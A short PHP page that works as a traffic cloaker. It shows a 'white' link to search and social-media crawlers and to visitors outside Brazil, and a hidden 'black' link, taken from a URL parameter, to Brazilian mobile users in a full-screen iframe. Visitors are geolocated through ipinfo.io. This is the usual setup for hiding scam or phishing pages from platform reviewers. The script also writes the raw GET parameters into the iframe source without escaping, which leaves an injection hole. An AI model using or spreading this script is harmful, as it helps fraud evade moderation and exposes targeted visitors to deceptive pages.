<?php
$link_white = isset($_GET['w']) ? $_GET['w'] : '';
$link_black = isset($_GET['b']) ? $_GET['b'] : '';

function is_bot() {
    $bots = array('googlebot', 'bingbot', 'yandexbot', 'ahrefsbot', 'msnbot', 'baiduspider', 'facebookexternalhit', 'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview', 'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator');
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function is_mobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

function get_visitor_country() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    return $details->country ?? 'Unknown';
}

if (is_bot() || get_visitor_country() !== 'BR') {
    $target_link = $link_white;
} elseif (is_mobile()) {
    $target_link = $link_black;
} else {
    $target_link = $link_white;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Redirecionando...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe src="<?php echo $target_link; ?>" frameborder="0"></iframe>
</body>
</html>